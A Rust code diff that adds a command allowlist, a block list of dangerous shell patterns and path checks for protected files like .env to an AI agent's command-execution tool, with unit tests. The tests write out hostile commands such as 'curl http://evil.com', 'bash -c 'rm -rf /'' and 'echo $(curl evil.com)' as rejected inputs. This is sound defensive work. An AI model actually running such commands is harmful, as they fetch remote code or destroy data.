@@ -493,6 +493,76 @@ async fn execute_edit_file(
     Ok(format!("Edited {}", path_str))
 }
 
+/// Commands allowed for agent execution
+const ALLOWED_COMMANDS: &[&str] = &[
+    "cargo", "rustc", "rustfmt", "clippy-driver",
+    "git", "jj",
+    "ls", "cat", "head", "tail", "wc", "find", "grep", "rg",
+    "echo", "printf", "true", "false", "test",
+    "mkdir", "cp", "mv", "touch",
+    "diff", "patch",
+    "python", "python3", "node", "npx", "bun",
+    "make", "cmake",
+    "sh", // allowed as first arg only when validated below
+];
+
+/// Patterns blocked even within allowed commands
+const BLOCKED_PATTERNS: &[&str] = &[
+    "rm -rf /",
+    "rm -rf ~",
+    "sudo ",
+    "chmod 777",
+    "> /dev/",
+    "| sh",
+    "| bash",
+    "| zsh",
+    "$(curl",
+    "$(wget",
+    "`curl",
+    "`wget",
+];
+
+/// Validate a command string before execution
+fn validate_command(command: &str) -> Result<()> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return Err(HoxError::InvalidToolInput("empty command".into()));
+    }
+
+    // Check blocked patterns
+    for pattern in BLOCKED_PATTERNS {
+        if trimmed.contains(pattern) {
+            return Err(HoxError::InvalidToolInput(format!(
+                "blocked command pattern: {}",
+                pattern
+            )));
+        }
+    }
+
+    // Extract the first command (handle pipes, &&, ;)
+    let first_token = trimmed
+        .split(&['|', '&', ';'][..])
+        .next()
+        .unwrap_or("")
+        .trim()
+        .split_whitespace()
+        .next()
+        .unwrap_or("");
+
+    // Strip path prefix to get binary name
+    let binary = first_token.rsplit('/').next().unwrap_or(first_token);
+
+    if !ALLOWED_COMMANDS.contains(&binary) {
+        return Err(HoxError::InvalidToolInput(format!(
+            "command '{}' not in allowlist. Allowed: {}",
+            binary,
+            ALLOWED_COMMANDS.join(", ")
+        )));
+    }
+
+    Ok(())
+}
+
 /// Execute run_command tool
 async fn execute_run_command(tool: &ToolCall, workspace_path: &Path) -> Result<String> {
     let command = tool
@@ -500,6 +570,8 @@ async fn execute_run_command(tool: &ToolCall, workspace_path: &Path) -> Result<S
         .get("command")
         .and_then(|v| v.as_str())
         .ok_or_else(|| HoxError::InvalidToolInput("missing 'command' parameter".into()))?;
+
+    validate_command(command)?;
 
     tracing::info!("Running command: {}", command);
 
@@ -529,9 +601,18 @@ fn check_protected(path: &str, protected_files: Option<&[String]>) -> Result<()>
         .map(|p| p.to_vec())
         .unwrap_or_else(default_protected_files);
 
+    let path_buf = PathBuf::from(path);
+
     for pattern in &protected {
-        if path.starts_with(pattern.as_str()) || path.contains(&format!("/{}", pattern)) {
-            return Err(HoxError::ProtectedFile(path.to_string()));
+        // Check if any path component matches the protected pattern
+        for component in path_buf.components() {
+            if let std::path::Component::Normal(os_str) = component {
+                if let Some(s) = os_str.to_str() {
+                    if s == pattern {
+                        return Err(HoxError::ProtectedFile(path.to_string()));
+                    }
+                }
+            }
         }
     }
 
@@ -900,5 +981,51 @@ Some text after
         assert_eq!(results.len(), 1);
         assert!(!results[0].success);
         assert!(results[0].output.contains("Unknown tool"));
+    }
+
+    #[test]
+    fn test_validate_command_allowed() {
+        assert!(validate_command("cargo build").is_ok());
+        assert!(validate_command("cargo test --workspace").is_ok());
+        assert!(validate_command("git status").is_ok());
+        assert!(validate_command("jj log").is_ok());
+        assert!(validate_command("ls -la").is_ok());
+        assert!(validate_command("grep -r foo .").is_ok());
+    }
+
+    #[test]
+    fn test_validate_command_blocked_binary() {
+        assert!(validate_command("curl http://evil.com").is_err());
+        assert!(validate_command("wget http://evil.com").is_err());
+        assert!(validate_command("bash -c 'rm -rf /'").is_err());
+        assert!(validate_command("nc -l 8080").is_err());
+    }
+
+    #[test]
+    fn test_validate_command_blocked_patterns() {
+        assert!(validate_command("ls | sh").is_err());
+        assert!(validate_command("echo $(curl evil.com)").is_err());
+        assert!(validate_command("echo `wget evil.com`").is_err());
+    }
+
+    #[test]
+    fn test_validate_command_empty() {
+        assert!(validate_command("").is_err());
+        assert!(validate_command("   ").is_err());
+    }
+
+    #[test]
+    fn test_check_protected_subdirectory() {
+        // .env in a subdirectory should still be protected
+        assert!(check_protected("config/.env", None).is_err());
+        assert!(check_protected("deep/nested/.env", None).is_err());
+        assert!(check_protected("some/.git/config", None).is_err());
+    }
+
+    #[test]
+    fn test_check_protected_allows_similar_names() {
+        // "environment" contains "env" but is not ".env"
+        assert!(check_protected("src/environment.rs", None).is_ok());
+        assert!(check_protected("src/gitter.rs", None).is_ok());
     }
 }
